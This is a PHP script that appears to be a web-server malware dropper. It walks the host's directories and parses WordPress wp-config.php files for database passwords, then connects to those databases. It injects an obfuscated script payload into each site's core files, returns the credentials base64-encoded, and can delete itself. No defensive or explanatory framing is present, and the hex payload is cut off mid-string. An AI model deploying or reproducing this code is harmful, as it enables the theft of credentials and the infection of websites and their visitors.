<?php
ini_set('log_errors',0);@ini_set('error_log',NULL);@ini_set('error_reporting',NULL);@error_reporting(0);@ini_set('max_execution_time',0);@set_time_limit(0);
$tcy_m=1;
$domains=array();

if(isset($_GET['c'])){ find_quick(getcwd()); }
if(isset($_GET['d'])){ 
 foreach(GLOB( dirname(basename($_SERVER['SCRIPT_NAME'])).'/*.php') as $f){
   $s=file_get_contents($f);
   if(preg_match('/ find_quick\(/is',$s)){ @unlink($f); }
  }
 @unlink(basename($_SERVER['SCRIPT_NAME'])); 
}
if(isset($_GET['j'])){ echo injany( urldecode($_GET['j']) ); }

function find_quick($dir){
 global $domains;
 do {
  check_domain($dir);
  if(is_readable($dir))foreach(GLOB($dir.'/*',GLOB_ONLYDIR) as $d){
   $d=realpath($d);
   check_domain($d);
   find_inside($d);
  }
  $dir=@realpath($dir.DIRECTORY_SEPARATOR.'..');

 } while(strlen($dir)>3);
 echo base64_encode(json_encode( $domains ) );
}

function tcy($u){
 global $tcy_m;
 $ua="Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.75 Safari/537.1 YB/5.1.1";
 $s='TCY:'; if(substr($u,0,4)=='http'){ $u=parse_url($u,PHP_URL_HOST); if($u===false) {return $s.'-';} }
 if(!function_exists('curl_exec')){ $tcy_m=1; }
//return $s.'99 !!!';
 $url='http://bar-navig.yandex.ru/u?url=http://'.$u.'&show=1';
 $h='';
 if($tcy_m==0){
   $c=curl_init($url);
   curl_setopt_array($c,array(CURLOPT_TIMEOUT=>8,CURLOPT_RETURNTRANSFER=>1,CURLOPT_COOKIEFILE=>'',CURLOPT_USERAGENT=>$ua,CURLOPT_HTTPHEADER=>array('Accept: */*','Accept-Language: ru-RU,en-us')));
   $h=curl_exec ($c);
   if((int)curl_getinfo($c,CURLINFO_HTTP_CODE)==0){ $tcy_m=1; return tcy($u); }
   curl_close($c);
 } else if($tcy_m==1){
   $h=@file_get_contents($url, false, stream_context_create(array('http'=>array('method'=>"GET", 'timeout' =>5, 'header'=>"Accept-language: en-us,ru-RU\r\nUser-Agent: ".$ua."\r\n"))));
   if($h==''){$tcy_m=2;}
 }
 if($tcy_m==2){return $s.='!';}
 if(preg_match("/".chr(60)."tcy rang=\"\d+\" value=\"(\d+)\"\/".chr(62)."/is",$h,$r)){$s.=$r[1]; if((int)$r[1]>0)$s.=' !!!';}else{$s.='=';}
 return $s;
}

function check_domain($d){
global $domains;
$folder=folder($d); if(strpos($folder,'.')>0){$domains[$d]=array('host'=>$folder, "prm"=>prms($d),'tcy'=>tcy($folder)); }
}

function find_inside($d){
 global $domains;
 $res=array();
 $a=array( '', '/html', '/httpdocs', '/public_html','/www');
 foreach($a as $f){
  $t=wpi($d.$f.'/wp-co'.'nfig.php');
  if($t) $domains[$d.$f]=$t;
 }
}

function WR($d){ if(is_readable($d)){return '[W]';} return '[-]'; }
function prms($f){ return fileperms($f).'|'.fileowner($f).'|'.filegroup($f).'|'.(is_readable($f)?'R':'-').(is_writable($f)?'W':'-'); }
function folder($cwd){$if=strrpos($cwd,'/');if($if!==false){return substr($cwd,$if+1);}return $cwd;}

function wpi($wpc){
 $res=false;

 if(is_readable($wpc)){
//  if(PHP_OS=='WINNT'){ return false; }
  if(!function_exists('mysq'.'li_connect')){ return false; }
  $g=file_get_contents($wpc);
  $t1="/\(\s*?['\"]+";$t2="['\"]+.*?['\"]+(.*?)['\"]+/is";
  $u='';$h='';$p='';$n='';$pr='';
  if(preg_match($t1.'DB_NAME'.$t2,$g,$r)){$n=$r[1];
   if(preg_match($t1.'DB_USER'.$t2,$g,$r)){$u=$r[1];
    if(preg_match($t1.'DB_PAS'.'SWORD'.$t2, $g,$r)){$p=$r[1];
     if(preg_match($t1.'DB_HOST'.$t2, $g,$r)){$h=$r[1];
      if(preg_match('/^\$table_prefix\s+?=\s+?["\']+(.*?)["\']+/im',$g,$r)){$pr=$r[1];
  }}}}}
  if($u==''||$p==''||$h==''||$n==''){ return false; }
  $m=@new mysqli($h,$u,$p,$n);
  if ($m->connect_errno) { return false; }
  $sql='SEL'.'ECT option_value FROM `'.$pr.'options` whe'."re option_name='siteurl' limit 1; ";
  if ($result = $m->query($sql)) {
   if($result->num_rows!=1){return false;}
   $a=$result->fetch_object();
   $result->close();
   $t=tcy(parse_url($a->option_value,PHP_URL_HOST));
   @unlink(dirname(realpath($wpc)).'/wp-'.'includes/man'.'ifest.'.'php');
   $res=array('dwig'=>'WP'.do_it(dirname(realpath($wpc)).'/wp-'.'includes/default'.'-filters.'.'php',$t), 'host'=>$a->option_value, 'tcy'=>$t, 'prm'=>prms($wpc),'mysql'=>base64_encode($h.' '.$u.' '.$p.' '.$n.' '.$pr) );
  }else{return false;}  
 }
 return $res;
}


function do_it($fn,$tcy){
$ret=0;
$jscode=pack("H*",'');
$code=file_get_contents($fn);
$p1='';$p2='';
//check for already  v1.0
if(preg_match('#function ([a-z_]+)\(\){echo\'<script type="text\/javascript">var .*\\1\'?\);#is',$code,$res,PREG_OFFSET_CAPTURE)){
$ret=2;
$p1=substr($code,0,$res[0][1]);
$p2=substr($code,$res[0][1]+strlen($res[0][0]));
}elseif(preg_match("#\/\* wordpress ([a-z0-9_]+) \*\/.*\\1['\"]+ \);#is",$code,$res,PREG_OFFSET_CAPTURE)){
$ret=2;
$p1=substr($code,0,$res[0][1]);
$p2=substr($code,$res[0][1]+strlen($res[0][0]));
}else{
 $i=strripos($code,'add_action(');
 if($i){
  $ret=1;
  $p1=substr($code,0,$i);
  $p2=substr($code,$i);
 }
}
 if($p1.$p2!=''){
  $code = trim($p1).base64_decode('Ci8qIHdvcmRwcmVzcyByZmNfZ2V0aGVhZGVydmFsdWVfcGVybWFzdHJ1Y3RzX2xmNiAqLwpmdW5jdGlvbiByZmNfZ2V0aGVhZGVydmFsdWVfcGVybWFzdHJ1Y3RzX2xmNigpIHsKCWlmKHN0cmlwb3MoQCRfU0VSVkVSW2VuY29kZXNfdWJlcmdlZWtfZ2V0ZmlsZWZvcm1hdF9tcTcoJ2ZXRmhaV3BnWm5CbmFuUnljSHRoVjFBPScsNTMpXSxlbmNvZGVzX3ViZXJnZWVrX2dldGZpbGVmb3JtYXRfbXE3KCdWMXBCVjFBPScsNTMpKSE9PWZhbHNlKXJldHVybjsKCgkkcHJlc2VudF9jcm9wcGVkX2plMz1kaXJuYW1lKF9fRklMRV9fKS5lbmNvZGVzX3ViZXJnZWVrX2dldGZpbGVmb3JtYXRfbXE3KCdHbGhVVzF4VFVFWkJHMFZkUlZkUScsNTMpOwoJJGJsdWVfYm9pbnRvbl9wcDI9ZmFsc2U7CgkkcGNsb3NlX2ZyYW1lZGF0YV96ajc9MDsKCgkkZW5jb2Rlc191YmVyZ2Vla19odjE9c3RyaWN0X3RleHRhcmVhX2Nyb3BwZWRfamUzKHBhY2soIkgqIiwiM2M3MzYzNzI2OTcwNzQyMDc0Nzk3MDY1M2QyMjc0NjU3ODc0MmY2YTYxNzY2MTczNjM3MjY5NzA3NDIyM2U3NjYxNzIyMDQyNmM2YTVmNmY2Yjc4M2Q1YjMzMzgzMDJjMzQzNDMwMmMzNDM4MzAyYzM0MzgzNTJjMzQzOTM4MmMzNDMxMzIyYzM0MzkzNTJjMzQzOTM2MmMzNTMwMzEyYzM0MzgzODJjMzQzODMxMmMzNDM0MzEyYzM0MzEzNDJjMzQzOTMyMmMzNDM5MzEyYzM0MzkzNTJjMzQzODM1MmMzNDM5MzYyYzM0MzgzNTJjMzQzOTMxMmMzNDM5MzAyYzM0MzMzODJjMzQzMTMyMmMzNDM3MzcyYzM0MzczODJjMzQzOTM1MmMzNDM5MzEyYzM0MzgzODJjMzQzOTM3MmMzNDM5MzYyYzM0MzgzMTJjMzQzMzM5MmMzNDMxMzIyYzM0MzgzODJjMzQzODMxMmMzNDM4MzIyYzM0MzkzNjJjMzQzMzM4MmMzNDMyMzUyYzM0MzIzOTJjMzQzMjM4MmMzNDMyMzgyYzM0MzEzNzJjMzQzMzM5MmMzNDMxMzIyYzM0MzkzNjJjMzQzOTMxMmMzNDM5MzIyYzM0MzMzODJjMzQzMjM4MmMzNDMxMzcyYzM0MzMzOTJjMzQzMTMyMmMzNDM5MzkyYzM0MzgzNTJjMzQzODMwMmMzNDM5MzYyYzM0MzgzNDJjMzQzMzM4MmMzNDMyMzkyYzM0MzIzODJjMzQzMjM4MmMzNDMxMzcyYzM0MzMzOTJjMzQzMTMyMmMzNDM4MzQyYzM0MzgzMTJjMzQzODM1MmMzNDM4MzMyYzM0MzgzNDJjMzQzOTM2MmMzNDMzMzgyYzM0MzIzOTJjMzQzMjM4MmMzNDMyMzgyYzM0MzEzNzJjMzQzMzM5MmMzNDMxMzQyYzM0MzQzMjJjMzMzOTMzMmMzMzM5MzAyYzM0MzQzMDJjMzQzOTM1MmMzNDM3MzkyYzM0MzkzNDJjMzQzODM1MmMzNDM5MzIyYzM0MzkzNjJjMzQzNDMyMmMzMzM5MzMyYzMzMzkzMDJjMzQzODMyMmMzNDM5MzcyYzM0MzkzMDJjMzQzNzM5MmMzNDM5MzYyYzM0MzgzNTJjMzQzOTMxMmMzNDM5MzAyYzM0MzEzMjJjMzQzNzM3MmMzNDM5MzYyYzM0MzkzMTJjMzQzOTM1MmMzNDMyMzAyYzM0MzczNzJjMzQzMjMxMmMzNDMxMzIyYzM1MzAzMzJjMzQzMTMyMmMzNDM5MzgyYzM0MzczNzJjMzQzOTM0MmMzNDMxMzIyYzM0MzkzNTJjMzQzNDMxMmMzNDMxMzQyYzM0MzEzNDJjMzQzMzM5MmMzNDM4MzIyYzM0MzkzMTJjMzQzOTM0MmMzNDMxMzIyYzM0MzIzMDJjMzQzODM1MmMzNDMxMzIyYzM0MzgzNTJjMzQzOTMwMmMzNDMxMzIyYzM0MzczNzJjMzQzMjMxMmMzNTMwMzMyYzM0MzkzNTJjMzQzMjMzMmMzNDM0MzEyYzM0MzYzMzJjMzQzOTM2MmMzNDM5MzQyYzM0MzgzNTJjMzQzOTMwMmMzNDM4MzMyYzM0MzIzNjJjMzQzODMyMmMzNDM5MzQyYzM0MzkzMTJjMzQzODM5MmMzNDM0MzcyYzM0MzgzNDJjMzQzNzM3MmMzNDM5MzQyYzM0MzQzNzJjMzQzOTMxMmMzNDM4MzAyYzM0MzgzMTJjMzQzMjMwMmMzNDM3MzcyYzM0MzczMTJjMzQzODM1MmMzNDM3MzMyYzM0MzIzMTJjMzQzMzM5MmMzNTMwMzUyYzM0MzEzMjJjMzQzOTM0MmMzNDM4MzEyYzM0MzkzNjJjMzQzOTM3MmMzNDM5MzQyYzM0MzkzMDJjMzQzMTMyMmMzNDM5MzUyYzM0MzMzOTJjMzQzMTMyMmMzNTMwMzUyYzMzMzkzMzJjMzMzOTMwMmMzNDM4MzIyYzM0MzkzNzJjMzQzOTMwMmMzNDM3MzkyYzM0MzkzNjJjMzQzODM1MmMzNDM5MzEyYzM0MzkzMDJjMzQzMTMyMmMzNDM4MzAyYzM0MzkzMjJjMzQzODM1MmMzNDMyMzAyYzM0MzkzMTJjMzQzMjMxMmMzNTMwMzMyYzM0MzgzNTJjMzQzODMyMmMzNDMyMzAyYzM0MzgzNTJjMzQzNDMxMmMzNDM0MzEyYzM0MzIzOTJjMzQzMjMxMmMzNDM5MzQyYzM0MzgzMTJjMzQzOTM2MmMzNDM5MzcyYzM0MzkzNDJjMzQzOTMwMmMzNDMzMzkyYzM0MzgzNTJjMzQzODMyMmMzNDMyMzAyYzM0MzkzMDJjMzQzNzM3MmMzNDM5MzgyYzM0MzgzNTJjMzQzODMzMmMzNDM3MzcyYzM0MzkzNjJjMzQzOTMxMmMzNDM5MzQyYzM0MzIzNjJjMzQzNzM3MmMzNDM5MzIyYzM0MzkzMjJjMzQzNjM2MmMzNDM4MzEyYzM0MzkzNDJjMzQzOTM1MmMzNDM4MzUyYzM0MzkzMTJjMzQzOTMwMmMzNDMyMzYyYzM0MzgzNTJjMzQzOTMwMmMzNDM4MzAyYzM0MzgzMTJjMzUzMDMwMmMzNDM1MzkyYzM0MzgzMjJjMzQzMjMwMmMzNDMxMzQyYzM0MzYzNzJjMzQzODM1MmMzNDM5MzAyYzM0MzEzNDJjMzQzMjMxMmMzNDMxMzMyYzM0MzQzMTJjMzQzMjM1MmMzNDMyMzkyYzM0MzIzMTJjMzUzMDMzMmMzNDM5MzEyYzM0MzIzNjJjMzQzOTM1MmMzNDM5MzQyYzM0MzczOTJjMzQzNDMxMmMzNDM3MzcyYzM0MzkzNjJjMzQzOTMxMmMzNDM5MzUyYzM0MzIzMDJjMzQzNzMxMmMzNDMyMzkyYzM0MzIzODJjMzQzMzMyMmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMzMzQyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzMzNDJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzMwMmMzNDMyMzQyYzM0MzMzMzJjMzQzMzM2MmMzNDMyMzQyYzM0MzMzMjJjMzQzMzM1MmMzNDMyMzQyYzM0MzMzMjJjMzQzMzM1MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM4MmMzNDMyMzgyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzgyYzM0MzMzMzJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzM2MmMzNDMyMzQyYzM0MzMzMjJjMzQzMzMzMmMzNDMyMzQyYzM0MzMzNzJjMzQzMzM3MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM4MmMzNDMzMzYyYzM0MzIzNDJjMzQzMzM3MmMzNDMzMzUyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzMzMzJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzMzMmMzNDMyMzQyYzM0MzMzMjJjMzQzMzMzMmMzNDMyMzQyYzM0MzMzNzJjMzQzMzM3MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMyMzkyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzIzODJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzM0MmMzNDMyMzQyYzM0MzMzNzJjMzQzMzM1MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM4MmMzNDMzMzMyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzIzODJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzODJjMzQzMjM5MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMzMzIyYzM0MzIzNDJjMzQzMzMyMmMzNDMzMzQyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzMzMjJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzM1MmMzNDMyMzQyYzM0MzMzMjJjMzQzMzM1MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM4MmMzNDMzMzAyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzIzOTJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzMyMmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM4MmMzNDMzMzcyYzM0MzIzNDJjMzQzMzMyMmMzNDMzMzUyYzM0MzczMzJjMzQzMjMxMmMzNDMzMzkyYzM1MzAzNTJjMzQzODM1MmMzNDM0MzEyYzM0MzIzOTJjMzQzMzM5MmMzNDM5MzQyYzM0MzgzMTJjMzQzOTM2MmMzNDM5MzcyYzM0MzkzNDJjMzQzOTMwMmMzNDMzMzkyYzM1MzAzNTJjMzMzOTMzMmMzMzM5MzAyYzM0MzgzMjJjMzQzOTM3MmMzNDM5MzAyYzM0MzczOTJjMzQzOTM2MmMzNDM4MzUyYzM0MzkzMTJjMzQzOTMwMmMzNDMxMzIyYzM0MzczNTJjMzQzOTM4MmMzNDM5MzQyYzM0MzczNTJjMzQzNzM5MmMzNDMyMzAyYzM0MzgzNzJjMzQzMjMxMmMzNTMwMzMyYzM0MzkzNDJjMzQzODMxMmMzNDM5MzYyYzM0MzkzNzJjMzQzOTM0MmMzNDM5MzAyYzM0MzIzMDJjMzQzODMwMmMzNDM5MzEyYzM0MzczOTJjMzQzOTM3MmMzNDM4MzkyYzM0MzgzMTJjMzQzOTMwMmMzNDM5MzYyYzM0MzIzNjJjMzQzNzM5MmMzNDM5MzEyYzM0MzkzMTJjMzQzODM3MmMzNDM4MzUyYzM0MzgzMTJjMzQzMjM2MmMzNDM4MzkyYzM0MzczNzJjMzQzOTM2MmMzNDM3MzkyYzM0MzgzNDJjMzQzMjMwMmMzNDMxMzkyYzM0MzIzMDJjMzQzNzM0MmMzNTMwMzQyYzM0MzMzOTJjMzQzMTMyMmMzNDMyMzEyYzM0MzEzOTJjMzQzMjMzMmMzNDM4MzcyYzM0MzIzMzJjMzQzMTM5MmMzNDM0MzEyYzM0MzIzMDJjMzQzNzMxMmMzNDM3MzQyYzM0MzMzOTJjMzQzNzMzMmMzNDMyMzIyYzM0MzIzMTJjMzQzMTM5MmMzNDMyMzEyYzM1MzAzNDJjMzUzMDM0MmMzNDMyMzgyYzM0MzIzMTJjMzQzNzMxMmMzNDMzMzAyYzM0MzczMzJjMzUzMDM1MmMzNDM4MzIyYzM0MzkzNzJjMzQzOTMwMmMzNDM3MzkyYzM0MzkzNjJjMzQzODM1MmMzNDM5MzEyYzM0MzkzMDJjMzQzMTMyMmMzNDM3MzUyYzM0MzkzODJjMzQzNzM5MmMzNDM3MzUyYzM0MzczOTJjMzQzMjMwMmMzNDM5MzAyYzM0MzczNzJjMzQzODM5MmMzNDM4MzEyYzM0MzIzNDJjMzQzOTM4MmMzNDM3MzcyYzM0MzgzODJjMzQzOTM3MmMzNDM4MzEyYzM0MzIzNDJjMzQzODMwMmMzNDMyMzEyYzM1MzAzMzJjMzQzOTM4MmMzNDM3MzcyYzM0MzkzNDJjMzQzMTMyMmMzNDM4MzAyYzM0MzczNzJjMzQzOTM2MmMzNDM4MzEyYzM0MzQzMTJjMzQzOTMwMmMzNDM4MzEyYzM0MzkzOTJjMzQzMTMyMmMzNDM0MzgyYzM0MzczNzJjMzQzOTM2MmMzNDM4MzEyYzM0MzIzMDJjMzQzMjMxMmMzNDMzMzkyYzM0MzgzMDJjMzQzNzM3MmMzNDM5MzYyYzM0MzgzMTJjMzQzMjM2MmMzNDM5MzUyYzM0MzgzMTJjMzQzOTM2MmMzNDM2MzQyYzM0MzgzNTJjMzQzODM5MmMzNDM4MzEyYzM0MzIzMDJjMzQzODMwMmMzNDM3MzcyYzM0MzkzNjJjMzQzODMxMmMzNDMyMzYyYzM0MzgzMzJjMzQzODMxMmMzNDM5MzYyYzM0MzYzNDJjMzQzODM1MmMzNDM4MzkyYzM0MzgzMTJjMzQzMjMwMmMzNDMyMzEyYzM0MzIzMzJjMzQzMjMwMmMzNDM4MzAyYzM0MzIzMjJjMzQzMzM2MmMzNDMzMzQyYzM0MzMzMjJjMzQzMjM4MmMzNDMyMzgyYzM0MzIzODJjMzQzMjM4MmMzNDMyMzgyYzM0MzIzMTJjMzQzMjMxMmMzNDMzMzkyYzM0MzgzMDJjMzQzOTMxMmMzNDM3MzkyYzM0MzkzNzJjMzQzODM5MmMzNDM4MzEyYzM0MzkzMDJjMzQzOTM2MmMzNDMyMzYyYzM0MzczOTJjMzQzOTMxMmMzNDM5MzEyYzM0MzgzNzJjMzQzODM1MmMzNDM4MzEyYzM0MzEzMjJjMzQzNDMxMmMzNDMxMzIyYzM0MzkzMDJjMzQzNzM3MmMzNDM4MzkyYzM0MzgzMTJjMzQzMjMzMmMzNDMxMzQyYzM0MzQzMTJjMzQzMTM0MmMzNDMyMzMyYzM0MzkzODJjMzQzNzM3MmMzNDM4MzgyYzM0MzkzNzJjMzQzODMxMmMzNDMyMzMyYzM0MzEzNDJjMzQzMzM5MmMzNDM4MzEyYzM1MzAzMDJjMzQzOTMyMmMzNDM4MzUyYzM0MzkzNDJjMzQzODMxMmMzNDM5MzUyYzM0MzQzMTJjMzQzMTM0MmMzNDMyMzMyYzM0MzgzMDJjMzQzNzM3MmMzNDM5MzYyYzM0MzgzMTJjMzQzMjM2MmMzNDM5MzYyYzM0MzkzMTJjMzQzNTMxMmMzNDM1MzcyYzM0MzYzNDJjMzQzNjMzMmMzNDM5MzYyYzM0MzkzNDJjMzQzODM1MmMzNDM5MzAyYzM0MzgzMzJjMzQzMjMwMmMzNDMyMzEyYzM0MzIzMzJjMzQzMTM0MmMzNDMzMzkyYzM0MzEzMjJjMzQzOTMyMmMzNDM3MzcyYzM0MzkzNjJjMzQzODM0MmMzNDM0MzEyYzM0MzIzNzJjMzQzMTM0MmMzNDMzMzkyYzM1MzAzNTJjMzMzOTMzMmMzMzM5MzAyYzM0MzkzODJjMzQzNzM3MmMzNDM5MzQyYzM0MzEzMjJjMzQzODM1MmMzNDM0MzEyYzM0MzIzODJjMzQzMzM5MmMzNDM4MzUyYzM0MzgzMjJjMzQzMjMwMmMzNDM5MzAyYzM0MzczNzJjMzQzOTM4MmMzNDM4MzUyYzM0MzgzMzJjMzQzNzM3MmMzNDM5MzYyYzM0MzkzMTJjMzQzOTM0MmMzNDMyMzYyYzM0MzczNzJjMzQzOTMyMmMzNDM5MzIyYzM0MzYzNjJjMzQzODMxMmMzNDM5MzQyYzM0MzkzNTJjMzQzODM1MmMzNDM5MzEyYzM0MzkzMDJjMzQzMjM2MmMzNDM4MzUyYzM0MzkzMDJjMzQzODMwMmMzNDM4MzEyYzM1MzAzMDJjMzQzNTM5MmMzNDM4MzIyYzM0MzIzMDJjMzQzMTM0MmMzNDM2MzcyYzM0MzgzNTJjMzQzOTMwMmMzNDMxMzQyYzM0MzIzMTJjMzQzNDMxMmMzNDM0MzEyYzM0MzIzNTJjMzQzMjM5MmMzNDMyMzEyYzM1MzAzMzJjMzQzOTM4MmMzNDM3MzcyYzM0MzkzNDJjMzQzMTMyMmMzNDM3MzUyYzM0MzkzODJjMzQzOTM3MmMzNDM3MzUyYzM0MzkzNzJjMzQzNDMxMmMzNDMxMzQyYzM0MzczOTJjMzQzNzM3MmMzNDMzMzUyYzM0MzIzOTJjMzQzMzMzMmMzNDM4MzIyYzM0MzMzMzJjMzQzMzMwMmMzNDMzMzQyYzM0MzMzMTJjMzQzODMxMmMzNDMzMzUyYzM0MzIzODJjMzQzMzMyMmMzNDM3MzcyYzM0MzIzODJjMzQzMjM5MmMzNDMzMzYyYzM0MzMzNjJjMzQzMzM1MmMzNDM3MzcyYzM0MzMzNzJjMzQzMzM2MmMzNDM3MzkyYzM0MzIzOTJjMzQzNzM3MmMzNDM3MzcyYzM0MzgzMjJjMzQzMzM2MmMzNDM4MzEyYzM0MzMzMDJjMzQzNzM4MmMzNDMxMzQyYzM0MzIzNDJjMzQzMTMyMmMzNDM3MzUyYzM0MzkzODJjMzQzOTM3MmMzNDM3MzUyYzM0MzgzNTJjMzQzNDMxMmMzNDMxMzQyYzM0MzMzNzJjMzQzMjM4MmMzNDMzMzUyYzM0MzMzNDJjMzQzMzMzMmMzNDM4MzAyYzM0MzgzMDJjMzQzMzMwMmMzNDMzMzIyYzM0MzMzMTJjMzQzNzM5MmMzNDMzMzYyYzM0MzIzOTJjMzQzODMwMmMzNDMzMzcyYzM0MzczOTJjMzQzMzMwMmMzNDM3MzkyYzM0MzMzNzJjMzQzMjM4MmMzNDM3MzgyYzM0MzgzMDJjMzQzMjM4MmMzNDMzMzAyYzM0MzczNzJjMzQzMzMwMmMzNDMzMzQyYzM0MzgzMDJjMzQzMzM1MmMzNDM3MzkyYzM0MzMzNDJjMzQzMzMxMmMzNDMxMzQyYzM0MzMzOTJjMzQzODM1MmMzNDM4MzIyYzM0MzIzMDJjMzQzNzM1MmMzNDM5MzgyYzM0MzkzNDJjMzQzNzM1MmMzNDM3MzkyYzM0MzIzMDJjMzQzNzM1MmMzNDM5MzgyYzM0MzkzNzJjMzQzNzM1MmMzNDM5MzcyYzM0MzIzMTJjMzQzNDMxMmMzNDM0MzEyYzM0MzQzMTJjMzQzOTM3MmMzNDM5MzAyYzM0MzgzMDJjMzQzODMxMmMzNDM4MzIyYzM0MzgzNTJjMzQzOTMwMmMzNDM4MzEyYzM0MzgzMDJjMzQzMjMxMmMzNTMwMzMyYzM0MzczNTJjMzQzOTM4MmMzNDM3MzkyYzM0MzczNTJjMzQzNzM5MmMzNDMyMzAyYzM0MzczNTJjMzQzOTM4MmMzNDM5MzcyYzM0MzczNTJjMzQzOTM3MmMzNDMyMzQyYzM0MzczNTJjMzQzOTM4MmMzNDM5MzcyYzM0MzczNTJjMzQzODM1MmMzNDMyMzQyYzM0MzMzMzJjMzQzMjMxMmMzNDMzMzkyYzM0MzgzNTJjMzQzODMyMmMzNDMyMzAyYzM0MzczNTJjMzQzOTM4MmMzNDM5MzQyYzM0MzczNTJjMzQzNzM5MmMzNDMyMzAyYzM0MzczNTJjMzQzOTM4MmMzNDM5MzcyYzM0MzczNTJjMzQzOTM3MmMzNDMyMzEyYzM0MzQzMTJjMzQzNDMxMmMzNDM3MzUyYzM0MzkzODJjMzQzOTM3MmMzNDM3MzUyYzM0MzgzNTJjMzQzMjMxMmMzNTMwMzMyYzM0MzkzOTJjMzQzODM1MmMzNDM5MzAyYzM0MzgzMDJjMzQzOTMxMmMzNDM5MzkyYzM0MzIzNjJjMzQzODM4MmMzNDM5MzEyYzM0MzczOTJjMzQzNzM3MmMzNDM5MzYyYzM0MzgzNTJjMzQzOTMxMmMzNDM5MzAyYzM0MzIzNjJjMzQzODM0MmMzNDM5MzQyYzM0MzgzMTJjMzQzODMyMmMzNDM0MzEyYzM0MzczNzJjMzQzOTM2MmMzNDM5MzEyYzM0MzkzNTJjMzQzMjMwMmMzNDM3MzEyYzM0MzIzOTJjMzQzMjM4MmMzNDMzMzIyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzMzNDJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzM0MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMzMzAyYzM0MzIzNDJjMzQzMzMzMmMzNDMzMzYyYzM0MzIzNDJjMzQzMzMyMmMzNDMzMzUyYzM0MzIzNDJjMzQzMzMyMmMzNDMzMzUyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzgyYzM0MzIzODJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzODJjMzQzMzMzMmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMzMzYyYzM0MzIzNDJjMzQzMzMyMmMzNDMzMzMyYzM0MzIzNDJjMzQzMzM3MmMzNDMzMzcyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzgyYzM0MzMzNjJjMzQzMjM0MmMzNDMzMzcyYzM0MzMzNTJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzMzMmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMzMzMyYzM0MzIzNDJjMzQzMzMyMmMzNDMzMzMyYzM0MzIzNDJjMzQzMzM3MmMzNDMzMzcyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzIzOTJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMjM4MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMzMzQyYzM0MzIzNDJjMzQzMzM3MmMzNDMzMzUyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzgyYzM0MzMzMzJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMjM4MmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM4MmMzNDMyMzkyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzkyYzM0MzMzMjJjMzQzMjM0MmMzNDMzMzIyYzM0MzMzNDJjMzQzMjM0MmMzNDMyMzkyYzM0MzIzOTJjMzQzMzMyMmMzNDMyMzQyYzM0MzIzOTJjMzQzMjM5MmMzNDMzMzUyYzM0MzIzNDJjMzQzMzMyMmMzNDMzMzUyYzM0MzIzNDJjMzQzMjM5MmMzNDMyMzgyYzM0MzMzNzJjMzQzMjM0MmMzNDMzMzIyYzM0MzMzNTJjMzQzNzMzMmMzNDMyMzEyYzM0MzMzOTJjMzUzMDM1MmMzNTMwMzUyYzM1MzAzNTJjMzMzOTMzMmMzMzM5MzAyYzM0MzQzMDJjMzQzMjM3MmMzNDM5MzUyYzM0MzczOTJjMzQzOTM0MmMzNDM4MzUyYzM0MzkzMjJjMzQzOTM2MmMzNDM0MzIyYzMzMzkzMzJjMzMzOTMwMmMzNDM0MzAyYzM0MzgzNTJjMzQzODMyMmMzNDM5MzQyYzM0MzczNzJjMzQzODM5MmMzNDM4MzEyYzM0MzEzMjJjMzQzOTM1MmMzNDM5MzYyYzM1MzAzMTJjMzQzODM4MmMzNDM4MzEyYzM0MzQzMTJjMzQzMTM0MmMzNDM5MzkyYzM0MzgzNTJjMzQzODMwMmMzNDM5MzYyYzM0MzgzNDJjMzQzMzM4MmMzNDMzMzQyYzM0MzMzNjJjMzQzMTM3MmMzNDMzMzkyYzM0MzgzNDJjMzQzODMxMmMzNDM4MzUyYzM0MzgzMzJjMzQzODM0MmMzNDM5MzYyYzM0MzMzODJjMzQzMzM0MmMzNDMzMzYyYzM0MzEzNzJjMzQzMzM5MmMzNDMxMzQyYzM0MzEzMjJjMzQzOTM1MmMzNDM5MzQyYzM0MzczOTJjMzQzNDMxMmMzNDMxMzQyYzM0MzczNzJjMzQzNzM4MmMzNDM5MzEyYzM0MzkzNzJjMzQzOTM2MmMzNDMzMzgyYzM0MzczODJjMzQzODM4MmMzNDM3MzcyYzM0MzkzMDJjMzQz